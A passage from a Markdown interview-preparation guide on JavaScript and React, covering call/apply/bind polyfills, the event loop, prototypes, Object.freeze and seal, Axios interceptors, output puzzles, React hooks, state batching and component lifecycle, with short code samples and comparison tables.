    | `call()` | Immediately | Comma-separated | Function result |
    | `apply()` | Immediately | Array | Function result |
    | `bind()` | Delayed | Comma-separated | New function |

    **When to use:**
    - `call()` → quick one-time invocation with a custom context
    - `apply()` → when arguments are already in an array (e.g. `Math.max.apply(null, arr)`)
    - `bind()` → reusable bound function, especially for event handlers and callbacks

    ```js
    // Real-world: without bind, `this` inside method loses context
    button.addEventListener("click", obj.method.bind(obj));
    ```

1. How to write a Polyfill for `bind()`?

    A polyfill replicates native behavior for environments where it's missing or to understand internals — a very common frontend interview question.

    **Basic polyfill:**
    ```js
    Function.prototype.myBind = function(context, ...args1) {
      const fn = this; // 'this' refers to the original function
      return function(...args2) {
        return fn.apply(context, [...args1, ...args2]);
      };
    };

    // Usage
    const obj = { name: "Bharat" };
    function greet(age) { console.log(this.name, age); }

    const boundFn = greet.myBind(obj, 25);
    boundFn(); // Bharat 25
    ```

    **How it works internally:**
    1. `this` inside `myBind` → the original function (`greet`) — store it in `fn` to preserve the reference.
    2. Return a new function that, when called, uses `apply()` to set `this` to `context` and merge pre-filled args (`args1`) with later args (`args2`).

    | Inside `myBind` | Role |
    | --- | --- |
    | `this` | The original function being bound |
    | `context` | The new `this` to lock to |
    | `args1` | Pre-filled arguments (partial application) |
    | `args2` | Arguments passed when the bound function is called |

    **Why `apply()` inside the polyfill?**
    - `apply()` lets us dynamically set `this` AND spread a merged array of arguments — `call()` won't work here because we can't spread the combined `[...args1, ...args2]` as individual args without knowing the count at write time.

    **Advanced: handling `new` keyword (differentiates strong candidates):**

    Real `bind()` ignores the bound `this` when used as a constructor with `new`. The polyfill must detect this and preserve the prototype chain:

    ```js
    Function.prototype.myBind = function(context, ...args1) {
      const fn = this;
      function boundFn(...args2) {
        // If called with 'new', 'this' is a new instance — ignore bound context
        return fn.apply(this instanceof boundFn ? this : context, [...args1, ...args2]);
      }
      // Preserve prototype chain so 'instanceof' and inherited methods work correctly
      boundFn.prototype = Object.create(fn.prototype);
      return boundFn;
    };
    ```

    | Candidate Level | What to demonstrate |
    | --- | --- |
    | Basic | Working polyfill using `apply()` |
    | Strong | Handle `new` keyword + preserve prototype chain |
    | Expert | Explain why `call()` alone can't replace `apply()` here |

    **Interlinks:** Uses the same `apply()` from `call/apply/bind` above. Partial application here is the same concept as in Currying (`bind(null, 2)` style). Writing to `Function.prototype` is Monkey Patching.

    **Interview answer:** "A `bind()` polyfill stores the original function and context, then returns a new function that uses `apply()` to invoke the original with the bound context and merged arguments. To handle `new`, check `this instanceof boundFn` — if true, ignore the bound context so the constructor sets `this` normally."

1. What is Garbage Collection?
    - An automatic memory management process that frees memory by removing unused objects using the **Mark and Sweep algorithm**.

    ```js
    function outer() {
      let name = "Mohamed";
      return function inner() { console.log(name); };
    }
    let result = outer();
    result(); // `name` is NOT GC'd — closure holds a reference

    function outer2() {
      let name = "Mohamed";
      return function inner() { console.log("Hello"); };
    }
    let result2 = outer2();
    // `name` IS GC'd — no reference in the returned closure
    ```

1. What is a First-Class Function and First-Class Citizen?
    - Functions are **First-Class Citizens** — they can be assigned to variables, passed as arguments, and returned from other functions, just like any other value.

    | Concept | Meaning |
    | --- | --- |
    | First-Class Function | Functions can be assigned, passed, and returned |
    | First-Class Citizen | The function itself — acts like any value |

    ```js
    const greet = function() { return "Hello!"; };    // Assigned to a variable

    function welcome(fn) { return fn(); }
    console.log(welcome(greet)); // "Hello!" — passed as argument

    function getGreet() {
      return function() { return "Hello Boss!"; };    // Returned from a function
    }
    console.log(getGreet()()); // "Hello Boss!"
    ```

1. Function Statement vs Expression vs Anonymous vs Named Function Expression

    | Term | Description |
    | --- | --- |
    | Function Statement / Declaration | `function` keyword — hoisted entirely |
    | Function Expression | Function assigned to a variable — not hoisted |
    | Anonymous Function | Function without a name, used in expressions or callbacks |
    | Named Function Expression | Function with an internal name assigned to a variable — useful for debugging |
    | Parameters | Variables in the function definition |
    | Arguments | Actual values passed when calling the function |

    ```js
    function greet(name) { console.log("Hello " + name); }     // Function Statement
    const sum = function(a, b) { return a + b; };               // Function Expression
    const multiply = function(a, b) { return a * b; };          // Anonymous Function
    const divide = function divide(a, b) { return a / b; };     // Named Function Expression

    function welcome(name, age) { console.log(`${name}, ${age}`); }  // name, age = parameters
    welcome("Mohamed", 25);                                           // "Mohamed", 25 = arguments
    ```

1. What is a Callback Function, Pure Function, and Higher-Order Function?
    - **Callback Function:** A function passed as an argument to another function.
    - **Pure Function:** Always returns the same output for the same input; no side effects.
    - **Higher-Order Function (HOF):** Takes another function as an argument or returns a function.

1. What is the Event Loop? (Detailed)
    - The Event Loop manages execution of synchronous and asynchronous tasks by checking the Call Stack, Microtask Queue, and Callback Queue (Macrotask Queue).
    - Continuously checks: Call Stack empty? → drain all **Microtasks** → run one **Macrotask** → repeat.

    | Queue | Examples | Priority |
    | --- | --- | --- |
    | Microtasks | `Promise.then()`, `async/await`, `MutationObserver` | ⬆ High |
    | Macrotasks (Callback Queue) | `setTimeout()`, `setInterval()`, `setImmediate()` (Node.js) | ⬇ Low |

1. What is JIT (Just-In-Time) Compilation?
    - JIT converts JavaScript code into machine code **at runtime** to improve performance.
    - Combines both **Interpretation** and **Compilation** for optimized execution.

1. What is the JavaScript Runtime Environment?
    - Provides everything needed to execute JavaScript code. Includes:
      - **JavaScript Engine** (V8 for Chrome/Node.js)
      - **Web APIs** (`setTimeout`, DOM APIs, `fetch`)
      - **Callback Queue**
      - **Event Loop**
    - Node.js is a popular JavaScript Runtime Environment for server-side development.

1. What is the Memory Heap?
    - A region where JavaScript stores dynamic data like objects and functions — unordered, managed by the engine.
    - Primitive values → stored in the **Call Stack**.
    - Objects and functions → stored in the **Heap**.
    - Garbage Collection (Mark and Sweep) automatically frees unused Heap memory.

1. What is Functional Programming in JavaScript?
    - A programming style using **pure, reusable functions** that operate on data without side effects, promoting immutability and code reusability.
    - Key concepts: **First-Class Functions**, **Higher-Order Functions**, **Pure Functions**, **Immutability**, **Recursion**, **Closures**.

1. What is Immutability?
    - Original data **cannot be changed**. Instead, a new copy is created with modifications.
    - Leads to predictable, bug-free code — a core principle of functional programming.

1. What is Callback Hell, and how do Promises and async/await solve it?
    - **Callback Hell:** Multiple nested callbacks making code hard to read and maintain.

    | Callback Hell | Promises |
    | --- | --- |
    | Deeply nested functions | Flat `.then()` chain |
    | Hard to read & debug | Readable with built-in `.catch()` |

    **Promise Methods:**

    | Method | Description |
    | --- | --- |
    | `Promise.all()` | Waits for all to resolve; rejects if any fails |
    | `Promise.race()` | Returns the first to resolve or reject |
    | `Promise.allSettled()` | Waits for all to settle (resolve or reject) |
    | `Promise.any()` | Returns first to resolve; ignores rejections |
    | `Promise.resolve()` | Returns an already-resolved promise |
    | `Promise.reject()` | Returns an already-rejected promise |

    `async`/`await` is syntactic sugar over Promises — makes async code look synchronous.

    ```js
    // Callback Hell
    createOrder(() => {
      makePayment(() => {
        showInvoice(() => {
          sendEmail(() => { console.log("Done"); });
        });
      });
    });

    // Promises
    createOrder()
      .then(makePayment)
      .then(showInvoice)
      .then(sendEmail)
      .then(() => console.log("Done"))
      .catch(() => console.log("Error!"));

    // async/await
    async function loadData() {
      try {
        const res = await fetch("https://api.example.com/data");
        const data = await res.json();
        console.log(data);
      } catch (err) {
        console.error(err);
      }
    }
    ```

1. What is Inversion of Control?
    - Giving control of program flow to another function — instead of managing all logic yourself, you pass the control to another function to decide when and how your code executes.

    ```js
    function greet(callback) {
      console.log("Welcome!");
      callback(); // Control is given to the callback
    }
    greet(() => console.log("Hello World"));
    ```

1. What is `process.nextTick()`?
    - A Node.js feature that schedules a callback to execute **immediately after the current operation**, before any I/O events or timers.
    - Runs before `setTimeout()`, `setImmediate()`, and I/O — part of the microtask queue.

1. What is the `this` keyword in JavaScript?
    - `this` refers to the **current execution context** — its value depends on how and where the function is called.

    ```js
    console.log(this); // window {} (global)

    const obj = {
      a: 10,
      fun: function() { console.log(this.a); },   // 10 — method call
      arrow: () => { console.log(this.a); },       // undefined — inherits outer `this` (global)
      fun2: function() {
        const inner = () => { console.log(this.a); };
        inner(); // 10 — arrow inherits from fun2's context
      }
    };

    const person = {
      name: "Mohamed",
      greet2: function() {
        setTimeout(() => { console.log(this.name); }, 1000); // Mohamed — arrow keeps parent `this`
      }
    };

    const student = { name: "Mohamed", printName: function() { console.log(this.name); } };
    const student2 = { name: "Nasrutheen" };
    student.printName.call(student2); // Nasrutheen — call() overrides `this`
    ```

1. What is Inheritance and Prototypal Inheritance?
    - **Inheritance:** An OOP concept where a child class acquires properties and methods of a parent class.
    - **Prototypal Inheritance:** JavaScript's mechanism where objects inherit from other objects through the **prototype chain** — if a property/method is not on the object itself, JavaScript looks up `[[Prototype]]`.

1. What is Event Propagation?
    - How events travel through the DOM. Three phases:
      1. **Capturing Phase** — Parent → Child (top-down)
      1. **Target Phase** — The exact element clicked
      1. **Bubbling Phase** — Child → Parent (bottom-up)

1. What is Event Bubbling?
    - Events move from the **target element (child) up to its parents**.
    - Example: clicking a `<button>` inside a `<div>`: `button → div → body → document → window`.

1. What is Event Capturing?
    - Events move from the **parent down to the target child** before reaching it.
    - Enable capturing by passing `true` as the third argument to `addEventListener`:
    ```js
    element.addEventListener("click", handler, true);
    ```

1. What is Event Delegation? (JavaScript)
    - Attach **one event listener to a parent** instead of multiple listeners on individual children.
    - Detect which child triggered the event using `event.target`.
    ```js
    document.querySelector("#list").addEventListener("click", (e) => {
      if (e.target.tagName === "LI") {
        console.log("Clicked:", e.target.innerText);
      }
    });
    ```

1. What is the Prototype Object Model in JavaScript?
    - Every JavaScript object has an internal `[[Prototype]]` link pointing to another object — its **prototype**.
    - When you access a property, JavaScript first looks on the object itself; if not found, it walks up the **prototype chain** until it finds it or reaches `null`.

    ```js
    const animal = { eat: true };
    const dog = Object.create(animal); // dog's [[Prototype]] = animal
    dog.bark = true;

    console.log(dog.bark);               // true  — own property
    console.log(dog.eat);                // true  — inherited from animal
    console.log(dog.hasOwnProperty("eat"));  // false
    console.log(dog.hasOwnProperty("bark")); // true

    // Prototype chain: dog → animal → Object.prototype → null
    ```

    ```js
    function Person(name) { this.name = name; }
    Person.prototype.greet = function() { console.log(`Hello, I'm ${this.name}`); };

    const p1 = new Person("Mohamed");
    p1.greet(); // "Hello, I'm Mohamed"
    // p1 owns `name`; `greet` lives on Person.prototype (shared by all instances)
    ```

    | Term | Description |
    | --- | --- |
    | `[[Prototype]]` | Internal link to the prototype object |
    | `__proto__` | Accessor for `[[Prototype]]` (legacy — avoid in production) |
    | `Object.getPrototypeOf(obj)` | Standard way to read the prototype |
    | `Object.create(proto)` | Create an object with a specific prototype |
    | `Constructor.prototype` | Shared object assigned as `[[Prototype]]` of all instances |

1. What is Prototypal Inheritance? (Detailed)
    - JavaScript's mechanism where **objects inherit directly from other objects** (not classes). An object can access properties and methods anywhere on its prototype chain.

    ```js
    // Object-based inheritance
    const vehicle = {
      type: "vehicle",
      describe() { console.log(`I am a ${this.type}`); }
    };
    const car = Object.create(vehicle);
    car.type = "car";
    car.drive = function() { console.log("Vroom!"); };

    car.describe(); // "I am a car" — inherited method, overridden property
    car.drive();    // "Vroom!" — own method

    // Prototype chain: car → vehicle → Object.prototype → null
    ```

    ```js
    // Class syntax — syntactic sugar over prototypal inheritance
    class Animal {
      constructor(name) { this.name = name; }
      speak() { console.log(`${this.name} makes a sound.`); }
    }
    class Dog extends Animal {
      speak() { console.log(`${this.name} barks.`); } // override
    }

    const d = new Dog("Rex");
    d.speak();                    // "Rex barks."
    console.log(d instanceof Animal); // true
    ```

    | Classical Inheritance | Prototypal Inheritance (JS) |
    | --- | --- |
    | Classes are blueprints; objects are instances | Objects inherit directly from other objects |
    | `extends` creates a class hierarchy | `[[Prototype]]` chain links objects |
    | Methods copied per instance | Methods shared via prototype chain (memory-efficient) |

---

### Objects & Built-in Methods

1. What does `Object.freeze()` do?
   - Makes an object **fully immutable (shallow)** — no properties can be added, removed, or modified.
   - `Object.freeze(obj)`:
     - Prevents adding new properties
     - Prevents deleting existing properties
     - Prevents modifying existing property values
     - Prevents changing property descriptors (`writable`, `configurable`)

   ```js
   const config = Object.freeze({ host: "localhost", port: 3000 });
   config.port = 8080;    // silently ignored (TypeError in strict mode)
   config.debug = true;   // silently ignored
   delete config.host;    // silently ignored
   console.log(config);   // { host: "localhost", port: 3000 }
   ```

   > **Shallow only** — nested objects are NOT frozen:
   ```js
   const obj = Object.freeze({ nested: { value: 1 } });
   obj.nested.value = 99; // ✅ This works — nested object is not frozen
   ```

1. What does `Object.seal()` do?
   - Prevents adding or deleting properties, but **allows modifying existing values**.
   - `Object.seal(obj)`:
     - Prevents adding new properties
     - Prevents deleting existing properties
     - Allows modifying existing property values ✅
     - Prevents changing property descriptors

   ```js
   const user = Object.seal({ name: "Alice", age: 25 });
   user.age = 30;       // ✅ Allowed — modifying existing value
   user.email = "...";  // ❌ Ignored — cannot add new property
   delete user.name;    // ❌ Ignored — cannot delete
   console.log(user);   // { name: "Alice", age: 30 }
   ```

1. What is the difference between `Object.freeze()` and `Object.seal()`?

   | Feature | `Object.freeze()` | `Object.seal()` |
   | --- | --- | --- |
   | Add new properties | ❌ No | ❌ No |
   | Delete properties | ❌ No | ❌ No |
   | Modify existing values | ❌ No | ✅ Yes |
   | Change property descriptors | ❌ No | ❌ No |
   | Use case | Read-only config/constants | Fixed-shape object with mutable values |

   > Both apply **shallowly** — nested objects require recursive application to be fully immutable/sealed.

1. How do you get a letter (alphabet) from a number in JavaScript?
   - Use `String.fromCharCode()` with ASCII values: `A = 65`, `B = 66`, ..., `Z = 90`.

   ```js
   String.fromCharCode(65);      // "A"
   String.fromCharCode(65 + 1);  // "B"
   String.fromCharCode(65 + 25); // "Z"

   // Get letter at 0-indexed position
   const getLetter = (n) => String.fromCharCode(65 + n);
   getLetter(0); // "A"
   getLetter(4); // "E"
   ```

1. What is an Axios Interceptor?
   - A **middleware function** that intercepts HTTP requests or responses globally — before they are sent or after they are received.
   - Used for: adding auth tokens, logging, error handling, request/response transformation.

   ```js
   // Request interceptor — attach auth token to every request
   axios.interceptors.request.use(
     (config) => {
       config.headers.Authorization = `Bearer ${localStorage.getItem("token")}`;
       return config;
     },
     (error) => Promise.reject(error)
   );

   // Response interceptor — handle 401 Unauthorized globally
   axios.interceptors.response.use(
     (response) => response,
     (error) => {
       if (error.response?.status === 401) {
         window.location.href = "/login";
       }
       return Promise.reject(error);
     }
   );
   ```

   | Type | Runs when | Common use |
   | --- | --- | --- |
   | Request interceptor | Before request is sent | Add auth headers, log requests |
   | Response interceptor | After response is received | Handle errors globally, transform data |

---

### Output Questions

1. What is the output? — Event Loop & Async execution order

    ```js
    console.log("Start");

    setTimeout(() => console.log("Timeout"), 0);

    queueMicrotask(() => console.log("Microtask"));

    Promise.resolve().then(() => console.log("Promise"));

    console.log("End");
    ```

    **Output:**
    ```
    Start
    End
    Microtask
    Promise
    Timeout
    ```

    **Why — step by step:**
    1. `console.log("Start")` → sync, runs immediately.
    1. `setTimeout(...)` → registered in Web API, callback moves to **Macrotask Queue** after 0ms.
    1. `queueMicrotask(...)` → callback pushed to **Microtask Queue**.
    1. `Promise.resolve().then(...)` → `.then` callback pushed to **Microtask Queue**.
    1. `console.log("End")` → sync, runs immediately.
    1. Call Stack is empty → drain **Microtask Queue** completely first → `Microtask`, then `Promise`.
    1. Pick one task from **Macrotask Queue** → `Timeout`.

    | Queue | What goes in | Priority |
    | --- | --- | --- |
    | Call Stack | Synchronous code | Runs first |
    | Microtask Queue | `Promise.then`, `queueMicrotask`, `async/await` | Before any macrotask |
    | Macrotask Queue | `setTimeout`, `setInterval`, I/O | After all microtasks |

1. What is the output? — String immutability

    ```js
    let check = "hello";
    check[0] = "x";
    console.log(check);
    ```

    **Output:**
    ```
    hello
    ```

    **Why?**
    - Strings in JavaScript are **immutable** — individual characters cannot be reassigned.
    - `check[0] = "x"` silently does nothing (in strict mode it throws a `TypeError`).
    - The variable `check` still holds the original string `"hello"`.

    **Correct way to modify a string:**
    ```js
    check = "x" + check.slice(1);
    console.log(check); // "xello"

    // Or using replace
    check = check.replace("h", "x");
    console.log(check); // "xello"
    ```

---

## 🟢 React

### Fundamentals

1. What is the difference between functional and class components?
   - **Class:** Uses `this`, lifecycle methods.
   - **Functional:** Uses hooks (`useState`, `useEffect`), simpler syntax.

1. What are functional components?
   - Functional components are JavaScript functions that accept arguments (called props) and return React elements that describe what should appear on the screen.

1. What is an implicit return in functional components?
   - If a component only contains a single return statement, you can skip the `return` keyword and curly braces by using parentheses:
   ```jsx
   const MyComponent = () => (
     <h1>Hello, world!</h1>
   );
   export default MyComponent;
   ```

1. Why must a React component return a single root element? (JSX, Virtual DOM & Reconciliation)
   - A React component must return a **single root element** — this is enforced by three interconnected reasons: JSX compilation, Virtual DOM structure, and reconciliation efficiency.

   **1. JSX compiles to a single JavaScript object**

   JSX is syntactic sugar for `React.createElement()`, which returns **one object**. A function can only return one value — returning two parallel JSX elements tries to return two objects simultaneously, which is invalid:
   ```jsx
   // ❌ Invalid — two objects returned
   function App() {
     return (
       <h1>Hello</h1>
       <p>World</p>
     );
   }

   // 👆 compiles to:
   return React.createElement("h1", null, "Hello"); // two separate calls — error
          React.createElement("p",  null, "World");
   ```

   **2. Virtual DOM requires a single root to build a tree**

   React builds a component tree (Virtual DOM) from the returned JSX. A tree by definition has one root node. Multiple sibling roots break the tree structure React's diffing algorithm depends on:
   ```
   ✅ Valid tree:        ❌ Invalid — two roots:
        App                  h1    p
        / \                (no common root)
       h1   p
   ```

   **3. Reconciliation (diffing) requires predictable structure**

   React's reconciler compares old and new Virtual DOM trees. A single root gives React a clear starting point — multiple roots would force React to manage multiple independent trees, making diffing complex and performance worse.

   **Solutions:**

   | Approach | Extra DOM node? | When to use |
   | --- | --- | --- |
   | `<div>` wrapper | ✅ Yes | When you need a real container for styling |
   | `<>...</>` Fragment | ❌ No | Most cases — clean DOM, no layout side-effects |
   | `<React.Fragment key={...}>` | ❌ No | When you need `key` prop (e.g. inside `.map()`) |

   ```jsx
   // ✅ Fragment — no extra DOM node (preferred)
   function App() {
     return (
       <>
         <h1>Hello</h1>
         <p>World</p>
       </>
     );
   }
   ```

   Fragment renders `<h1>` and `<p>` directly into the parent — no wrapper `<div>` clutters the DOM or affects CSS layout (e.g. flexbox/grid child counts).

1. Why is JSX not valid JavaScript?
   - Browsers cannot directly interpret JSX. It must be transpiled (commonly by Babel) into JavaScript that React can execute.

1. React Elements vs. HTML Elements

   | Feature        | React Element                         | HTML Element                              |
   | -------------- | ------------------------------------- | ----------------------------------------- |
   | What it is     | JS object (virtual DOM node)          | Actual DOM node in browser                |
   | Mutability     | ❌ Immutable                          | ✅ Mutable                                |
   | Created by     | JSX / `React.createElement()`         | HTML / `document.createElement()`         |
   | Where it lives | Virtual DOM (in memory)               | Real DOM (browser DOM tree)               |
   | Performance    | Efficient (batch updates via diffing) | Slower when modified directly & repeatedly |
   | Purpose        | Describe what UI should look like     | Rendered UI on screen                     |

   **Rendering flow:**
   ```
   JSX (developer writes)
      ↓
   React.createElement()
      ↓
   React Element (JS object)
      ↓
   Virtual DOM
      ↓
   React DOM reconciler
      ↓
   Real HTML Element (browser renders)
   ```

1. What are the advantages of React?
   - **Component-Based Architecture:** Build UIs as reusable, composable components — improves maintainability and scalability.
   - **Virtual DOM:** React diffs a lightweight in-memory representation first, then applies only the minimal set of changes to the real DOM — better performance than direct DOM manipulation.
   - **Declarative UI:** Describe *what* the UI should look like given the current state — React handles *how* to update it. Code is predictable and easier to debug.
   - **JSX Syntax:** Write HTML-like markup inside JavaScript — more readable and tooling-friendly.
   - **React Hooks:** Introduced in v16.8 — use state and lifecycle features in function components, eliminating most need for class components.
   - **Unidirectional Data Flow:** Data flows down via props, events bubble up — makes data flow easier to trace and debug.
   - **Rich Ecosystem:** React Router, Redux, Zustand, React Query, and more. Integrates easily with existing projects.
   - **Cross-Platform:** React Native reuses the same mental model for mobile development.
   - **SEO-Friendly:** Server-side rendering via Next.js improves search engine visibility.
   - **Large Community:** Extensive libraries, tutorials, and third-party tooling.

1. What are the Rules of Hooks?
   - There are two core rules enforced by React (and the `eslint-plugin-react-hooks` lint rule):

   **Rule 1 — Only call hooks at the top level**
   - Never call hooks inside loops, conditions, or nested functions.
   - **Why:** React identifies hooks by their call order. If call order changes between renders (due to conditional execution), React cannot correctly match state and effects to the right hook slot.

   ```jsx
   // ❌ Wrong — hook inside condition
   if (isLoggedIn) {
     const [user, setUser] = useState(null); // breaks hook order
   }

   // ✅ Correct — hook at the top, condition inside
   const [user, setUser] = useState(null);
   if (isLoggedIn) { /* use user here */ }
   ```

   **Rule 2 — Only call hooks from React functions**
   - Call hooks from React function components or custom hooks — never from regular JavaScript functions, class components, or event handlers outside of components.
   - **Why:** Ensures all stateful logic is clearly visible in the component's source code and stays within React's rendering lifecycle.

   ```jsx
   // ❌ Wrong — hook called from a plain JS function
   function fetchUser() {
     const [data, setData] = useState(null); // not a React function
   }

   // ✅ Correct — hook called from a function component
   function UserProfile() {
     const [data, setData] = useState(null); // ✅
   }

   // ✅ Correct — hook called from a custom hook
   function useUser() {
     const [data, setData] = useState(null); // ✅
   }
   ```

1. What is the difference between a Pure Function and a Pure Component?

   **Pure Function**
   - A function that always returns the **same output for the same input** and has **no side effects** (doesn't modify external state).
   ```js
   const add = (a, b) => a + b; // same args → same result, no side effects ✅
   ```

   **Pure Component (React)**
   - A React component that **skips re-rendering when props and state haven't changed**, using shallow comparison.
   - **Class components:** extend `React.PureComponent` instead of `React.Component`.
   - **Function components:** wrap with `React.memo()` for the equivalent behavior.

   ```jsx
   // Class — PureComponent
   class MyList extends React.PureComponent {
     render() { return <ul>{this.props.items.map(i => <li key={i}>{i}</li>)}</ul>; }
   }

   // Function — React.memo
   const MyList = React.memo(({ items }) => (
     <ul>{items.map(i => <li key={i}>{i}</li>)}</ul>
   ));
   ```

   | | Pure Function | Pure Component |
   | --- | --- | --- |
   | What it is | General programming concept | React-specific optimization |
   | Deterministic output | ✅ Always | ✅ Same props/state → same render |
   | Side effects | ❌ None | ❌ Avoids unnecessary renders |
   | Comparison | N/A | Shallow prop + state comparison |
   | Class API | — | `React.PureComponent` |
   | Function API | — | `React.memo()` |

---

### Props & State

1. What are props in React?
   - Read-only data passed from parent to child to configure components.

1. What is the difference between props and state?
   - **Props:** Immutable, passed from parent.
   - **State:** Mutable, managed within the component.

1. Can a child component modify props directly?
   - ❌ No. Props are read-only; children use callback functions to update parent data.

1. What is the `children` prop used for?
    - To render nested JSX elements inside a component.

1. What is the purpose of `defaultProps`?
    - To define default values when a prop isn't passed.

1. Is `useState` mutable or immutable in React?
    - `useState` is **immutable** in React. React always expects you to create new state, not modify the existing state. If the existing state is mutated directly, React may not re-render.

    **Wrong approach (direct mutation):**
    ```jsx
    const addItem = () => {
      items.push('cherry'); // 🔴 Mutating state directly
      setItems(items);
    };
    ```

    **Correct approach (immutability):**
    ```jsx
    const addItem = () => {
      setItems([...items, 'cherry']); // ✅ Creating a new array
    };
    ```

1. How does React batch state updates? And can you prevent automatic batching? (`flushSync`)
   - React **batches** multiple state updates into a single re-render instead of triggering a render for each call. It queues all updates, then applies them together in one pass.

   **Why batching matters — stale value trap:**
   ```jsx
   const [count, setCount] = useState(0);

   function handleClick() {
     setCount(count + 1); // queued: 0 + 1
     setCount(count + 1); // queued: 0 + 1 (same stale value!)
     setCount(count + 1); // queued: 0 + 1
   }
   // Result: count = 1 ❌ (expected 3)
   ```

   **Fix — use functional updates to always get the latest value:**
   ```jsx
   function handleClick() {
     setCount(prev => prev + 1); // 0 → 1
     setCount(prev => prev + 1); // 1 → 2
     setCount(prev => prev + 1); // 2 → 3
   }
   // Result: count = 3 ✅
   ```

   **React 18 automatic batching — works everywhere:**

   | Context | React 17 | React 18 |
   | --- | --- | --- |
   | Event handlers | ✅ Batched | ✅ Batched |
   | `setTimeout` / `setInterval` | ❌ Not batched | ✅ Batched |
   | Promises / `async/await` | ❌ Not batched | ✅ Batched |
   | Native DOM events | ❌ Not batched | ✅ Batched |

   ```jsx
   // React 18 — even inside setTimeout, only ONE re-render
   setTimeout(() => {
     setCount(c => c + 1);
     setFlag(true);
   }, 1000); // ✅ one render
   ```

   **Preventing automatic batching — `flushSync` (escape hatch):**

   Use `flushSync` from `react-dom` when you need the DOM updated **immediately** before the next line runs (e.g. to focus an element that doesn't exist until after a render):
   ```jsx
   import { flushSync } from "react-dom";

   function handleClick() {
     flushSync(() => {
       setOpen(true); // React renders synchronously right now
     });
     // DOM is guaranteed up-to-date here
     document.getElementById("modal").focus();

     flushSync(() => {
       setCount(c => c + 1); // another immediate render
     });
   }
   // Result: TWO renders instead of one ⚠️
   ```

   | | Batching (default) | `flushSync` |
   | --- | --- | --- |
   | Re-renders | 1 (grouped) | 1 per `flushSync` call |
   | Performance | ✅ Optimal | ❌ More renders |
   | Use case | Everything normal | DOM measurement, third-party lib integration |

   - `flushSync` is an escape hatch — prefer `useLayoutEffect` or `useEffect` for most post-render DOM work.
   - Never use `flushSync` inside `useEffect` or React lifecycle — it can cause infinite loops.

1. What is the `setState` updater function and when should you use it?
   - The **updater function** is the function form of `setState` — it receives **previous state** as an argument and returns the next state. This guarantees you always operate on the most current value, even when React batches updates.

   **Without updater — stale value problem:**
   ```jsx
   setCount(count + 1); // all three read stale count = 0
   setCount(count + 1);
   setCount(count + 1);
   // Result: +1 ❌
   ```

   **With updater — correct sequential execution:**
   ```jsx
   setCount(prev => prev + 1); // 0 → 1
   setCount(prev => prev + 1); // 1 → 2
   setCount(prev => prev + 1); // 2 → 3
   // Result: +3 ✅
   ```

   | When to use | When NOT needed |
   | --- | --- |
   | Counter: `prev => prev + 1` | Static value: `setName("Sudheer")` |
   | Toggle: `prev => !prev` | User input: `setInput(e.target.value)` |
   | Array append: `prev => [...prev, item]` | Any value independent of previous state |

   **One-liner:** Use the updater function when the next state depends on the previous state to avoid stale values from batching.

1. Is `useState` synchronous or asynchronous?
   - `useState` is **neither purely synchronous nor truly asynchronous** — it is **batched and scheduled**: React queues the update and applies it during the next render cycle.

   ```jsx
   const [count, setCount] = useState(0);

   function handleClick() {
     setCount(count + 1);
     console.log(count); // 👉 still 0 — update not applied yet
   }
   ```

   - `setCount` does **not** return a Promise — you cannot `await` it.
   - The new value is only available in the **next render** via `count` from `useState`.
   - To always use the latest value during the same event, use an updater: `setCount(prev => prev + 1)`.

   **One-liner:** `useState` updates are not immediate — React batches and schedules them, so they behave asynchronously even though they return nothing.

1. How does `useState` work internally?
   - React stores each component's state in an **internal array (hooks list)** indexed by call order. Each `useState` gets a fixed slot. On re-render, React reads the previous value, applies queued updater functions in sequence, and returns the new state.

   **Simplified mental model:**
   ```js
   let hooks = [];
   let index = 0;

   function useState(initial) {
     const i = index++;
     hooks[i] = hooks[i] ?? initial;

     function setState(value) {
       hooks[i] = typeof value === "function" ? value(hooks[i]) : value;
       render(); // schedule re-render
     }

     return [hooks[i], setState];
   }
   ```

   - Index resets to `0` before each render — hooks must be called in the **same order every time** (no conditionals or loops).
   - **Updater queue:** `setCount(prev => prev + 1)` called three times queues functions that run sequentially: `0 → 1 → 2 → 3`.
   - **Direct value:** `setCount(count + 1)` called three times all read the same stale snapshot → only `+1`.

---

### Lifecycle

1. React Component Lifecycle (Class & Functional)

    Every React component goes through three main phases: **Mounting → Updating → Unmounting**

    **Class Component Lifecycle Methods:**

    | Phase      | Method                              | Purpose                                  | When It Runs                        |
    | ---------- | ----------------------------------- | ---------------------------------------- | ----------------------------------- |
    | Mounting   | `constructor()`                     | Initialize state and bind methods        | Before component appears on screen  |
    |            | `getDerivedStateFromProps()`        | Sync state from props (rarely used)      | Before every render                 |
    |            | `render()`                          | Return JSX (UI)                          | During render                       |
    |            | `componentDidMount()`               | Run side effects (fetch, subscriptions)  | After first render                  |
    | Updating   | `shouldComponentUpdate()`           | Optimize by skipping re-renders          | Before re-render                    |
    |            | `getSnapshotBeforeUpdate()`         | Capture DOM info before update           | Before DOM changes                  |
    |            | `componentDidUpdate()`              | Run side effects after updates           | After DOM is updated                |
    | Unmounting | `componentWillUnmount()`            | Cleanup (timers, listeners, etc.)        | Before component is removed         |

    **Example:**
    ```jsx
    class MyComponent extends React.Component {
      constructor(props) {
        super(props);
        this.state = { data: null };
      }
      componentDidMount() { console.log("Mounted"); }
      shouldComponentUpdate(nextProps, nextState) {
        return nextState.data !== this.state.data;
      }
      componentDidUpdate() { console.log("Updated"); }
      componentWillUnmount() { console.log("Unmounted"); }
      render() { return <div>{this.state.data}</div>; }
    }
    ```

    **Functional Component Hooks Equivalent:**

    | Lifecycle Stage  | Class Method                 | Functional Equivalent (Hooks)                       |
    | ---------------- | ---------------------------- | --------------------------------------------------- |
    | Mounting         | `componentDidMount()`        | `useEffect(() => { ... }, [])`                      |
    | Updating         | `componentDidUpdate()`       | `useEffect(() => { ... }, [dependencies])`          |
    | Unmounting       | `componentWillUnmount()`     | Cleanup function returned inside `useEffect()`      |
    | State init       | `constructor()`              | `useState()`                                        |
    | Derived state    | `getDerivedStateFromProps()` | Logic inside `useEffect()` reacting to prop changes |

    **Example:**
    ```jsx
    import React, { useState, useEffect } from "react";

    function MyComponent() {
      const [data, setData] = useState(null);

      useEffect(() => {
        console.log("Mounted or Updated");
        setData("Hello React!");
        return () => { console.log("Cleanup before unmount"); };
      }, []); // empty array = run once on mount

      return <div>{data}</div>;
    }
    ```

---

### Rendering Pipeline

1. Render vs Paint in React

    These are two distinct phases — React owns **Render**, the browser owns **Paint**.

    **Render Phase (React's work):**
    - React runs your component functions to compute what the UI should look like.
    - Diffs the new virtual DOM against the previous one (**reconciliation**).
    - Determines the minimal set of real DOM changes needed.
    - Does **not** touch the screen yet.

